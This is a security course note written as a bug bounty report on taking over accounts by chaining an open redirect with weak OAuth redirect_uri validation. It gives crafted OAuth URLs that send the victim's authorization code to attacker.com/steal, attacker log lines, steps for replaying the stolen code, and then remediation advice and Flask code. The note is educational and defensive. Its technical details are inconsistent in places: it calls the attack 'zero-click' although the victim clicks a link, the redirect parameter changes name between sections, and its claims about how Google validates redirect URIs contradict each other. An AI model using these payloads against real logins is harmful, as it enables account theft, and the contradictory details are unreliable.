---
tags: [bug-bounty, chaining, real-world, vapt]
difficulty: advanced
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.02 Bug Bounty Report Account Takeover Chain"
---

# 60.02 Bug Bounty Report: Zero-Click Account Takeover Chain via OAuth & Open Redirect

## 1. Executive Summary

During a penetration test for an e-commerce platform, a zero-click Account Takeover (ATO) vulnerability was discovered. This critical security flaw was not the result of a single catastrophic bug, but rather an elegant chain of three distinct low-to-medium severity vulnerabilities: an Open Redirect, an OAuth misconfiguration, and a lack of State parameter validation.

When chained together, an attacker could craft a malicious URL. Once a victim clicked this URL, their OAuth authorization flow was hijacked and redirected to an attacker-controlled server, exfiltrating the OAuth `code`. The attacker could then complete the login process on their own browser, gaining full access to the victim's account without requiring any password or 2FA bypassing. This vulnerability achieved a CVSS 3.1 score of 9.6 (Critical) and resulted in a significant bounty payout.

This note breaks down the mechanics of the chain, showing how independent components, when synthesized, create devastating outcomes.

## 2. Vulnerability Description

The exploit chain consisted of three separate weaknesses:

1.  **Open Redirect:** The application had an endpoint `/logout?redirect_uri=` that failed to validate the domain of the redirect target, allowing users to be bounced to arbitrary external domains.
2.  **Improper Redirect URI Validation in OAuth:** The OAuth integration with the identity provider (IdP) validated redirect URIs based on a wild-carded domain structure (e.g., `*.target.com`) or allowed path traversal within the same domain.
3.  **Missing `state` Parameter Validation:** The OAuth flow did not rigorously implement or check the `state` parameter to prevent Cross-Site Request Forgery (CSRF) on the authorization step.

By combining these, the attacker forces the victim's browser to initiate an OAuth login, but manipulate the `redirect_uri` to point back to the vulnerable Open Redirect endpoint on the main site. The Open Redirect then bounces the request (along with the appended OAuth `code`) to the attacker's server.

## 3. Scope and Target

- **Target Domain:** `auth.target-ecommerce.com`
- **Application Flow:** Social Login via Google and Apple
- **Vulnerable Components:** `/logout` endpoint, OAuth callback validation
- **Impact:** Critical (Complete Account Takeover)

## 4. Prerequisites

1. The victim must have an existing account on `target-ecommerce.com` linked via OAuth (e.g., Sign in with Google).
2. The victim must be currently authenticated with their OAuth provider (e.g., logged into their Google account on their browser).
3. The attacker needs to host a simple listener server to catch the exfiltrated tokens.

## 5. ASCII Architecture & Attack Diagram

```text
                                Victim Browser
                                      |
                                      | 1. Clicks Malicious Link
                                      v
+-----------------------------------------------------------------------------------+
| Attacker Link:                                                                    |
| https://auth.target.com/oauth/login?provider=google&                              |
| redirect_uri=https://auth.target.com/logout?redirect_url=http://attacker.com      |
+-----------------------------------------------------------------------------------+
                                      |
                                      | 2. App initiates OAuth flow with IdP
                                      v
                            +-------------------+
                            |                   |
                            |  Google OAuth     |
                            |  Provider (IdP)   |
                            |                   |
                            +-------------------+
                                      |
                                      | 3. User authenticated. IdP redirects back to
                                      |    the provided redirect_uri with ?code=XYZ
                                      v
+-----------------------------------------------------------------------------------+
| IdP Redirects Victim To:                                                          |
| https://auth.target.com/logout?redirect_url=http://attacker.com&code=XYZ          |
+-----------------------------------------------------------------------------------+
                                      |
                                      | 4. Open Redirect triggers, sending the code
                                      |    to the attacker's server.
                                      v
                            +-------------------+
                            |                   |
                            |  Attacker Server  | <-- Logs: ?code=XYZ
                            |                   |
                            +-------------------+
                                      |
                                      | 5. Attacker redeems code on their browser
                                      v
                            +-------------------+
                            |                   |
                            |  Target Website   | <-- Attacker is now logged
                            |  (auth.target.com)|     in as the Victim!
                            |                   |
                            +-------------------+
```

## 6. Step-by-Step Proof of Concept (PoC)

### Step 1: Identifying the Open Redirect

During routine enumeration, the `/logout` endpoint was observed taking a `next` parameter.
Test URL: `https://auth.target.com/logout?next=https://evil.com`
Response:
```http
HTTP/1.1 302 Found
Location: https://evil.com
```
The Open Redirect was confirmed. On its own, this is a Low severity issue (often accepted as an informational risk for phishing).

### Step 2: Analyzing the OAuth Flow

The user initiates login via `https://auth.target.com/login/google`.
This redirects to Google:
```http
https://accounts.google.com/o/oauth2/v2/auth?
client_id=12345.apps.googleusercontent.com
&redirect_uri=https://auth.target.com/oauth/callback
&response_type=code
&scope=email profile
```

### Step 3: Bypassing Redirect URI Validation

To steal the code, the `redirect_uri` sent to Google must point to the attacker. However, Google strictly validates the exact `redirect_uri` against the whitelisted URLs in the developer console.

The whitelist likely contained `https://auth.target.com/*`.
So, changing the redirect to `https://evil.com` fails.
However, changing it to `https://auth.target.com/logout?next=https://evil.com` SUCCEEDS, because the base domain matches the whitelist.

### Step 4: Crafting the Final Payload

The final crafted URL sent to the victim:

```text
https://accounts.google.com/o/oauth2/v2/auth?client_id=12345.apps.googleusercontent.com&response_type=code&scope=email%20profile&redirect_uri=https://auth.target.com/logout?next=https://attacker.com/steal
```

When the victim clicks this link:
1. Google recognizes the user is already logged in.
2. Google trusts the `redirect_uri` because it starts with `https://auth.target.com`.
3. Google redirects the victim to: `https://auth.target.com/logout?next=https://attacker.com/steal&code=AUTH_CODE_123`
4. The vulnerable `/logout` endpoint executes the Open Redirect, sending the victim to: `https://attacker.com/steal&code=AUTH_CODE_123`

### Step 5: Exploitation and Account Takeover

The attacker checks their web server logs:
```text
GET /steal&code=4/0AX4XfWh... HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0...
```

The attacker then manually takes this code and replays it to the legitimate callback endpoint:
`https://auth.target.com/oauth/callback?code=4/0AX4XfWh...`

The server validates the code with Google, logs the attacker in as the victim, and issues a valid session cookie.

## 7. Deep Dive: Why did this happen?

This vulnerability chain highlights the danger of isolated security assessments. The developers likely thought:
- "Open Redirects are low risk, we won't fix it right now."
- "OAuth is secure because Google handles the heavy lifting."

However, they failed to account for:
1. **Lax OAuth Whitelisting:** Using wildcard domain matching for OAuth callbacks is extremely dangerous. Callbacks must be absolute, exact string matches.
2. **Missing State Parameter:** The OAuth `state` parameter is designed specifically to prevent CSRF in the authorization flow. By omitting it, the application couldn't verify that the user initiating the OAuth flow was the same one redeeming the code.

## 8. Impact Assessment

- **Complete Account Compromise:** The attacker gains identical privileges to the victim. They can change email addresses, view billing information, and make unauthorized purchases.
- **Bypass of Multi-Factor Authentication (MFA):** Because the attack piggybacks on the existing, authenticated OAuth session (which already passed MFA at the IdP level), the application assumes the user is fully verified.

## 9. Remediation and Mitigation

1. **Strict OAuth Redirect URI Validation:** Configure the OAuth Identity Provider to ONLY accept exact, absolute URLs (e.g., `https://auth.target.com/oauth/callback`). Do not allow wildcards or path variables.
2. **Implement and Enforce the `state` Parameter:** Generate a cryptographically secure, random nonce (the `state` parameter) when initiating the OAuth flow. Store this in the user's session. When the callback is received, strictly verify that the `state` parameter matches the one in the session.
3. **Patch the Open Redirect:** Validate all redirect URLs against a strict whitelist of allowed internal paths. Do not allow arbitrary external domains in the `next` or `redirect_uri` parameters.

```python
# Example Mitigation for Open Redirect (Flask/Python)
from urllib.parse import urlparse, urljoin
from flask import request, redirect, url_for

def is_safe_url(target):
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return test_url.scheme in ('http', 'https') and \
           ref_url.netloc == test_url.netloc

@app.route('/logout')
def logout():
    target = request.args.get('next')
    if not is_safe_url(target):
        return abort(400, "Unsafe redirect destination")
    return redirect(target)
```

## 10. Chaining Opportunities

- **[[01 - Bug Bounty Report Critical SQLi]]:** If an ATO provides access to internal dashboards, it might expose endpoints vulnerable to SQLi that are otherwise unauthenticated.
- **[[04 - Bug Bounty Report Subdomain Takeover]]:** An open redirect might point to a taken-over subdomain, making the exploit look more legitimate to the victim since the domain matches the target organization.

## 11. Related Notes

- [[03 - Bug Bounty Report SSRF to RCE]] - Another example of an exploit chain.
- [[31 - API Security]] - Core API security concepts.
- [[42 - OAuth 2.0 Security Vulnerabilities]] - In-depth guide on the `state` parameter and OAuth misconfigurations.

```
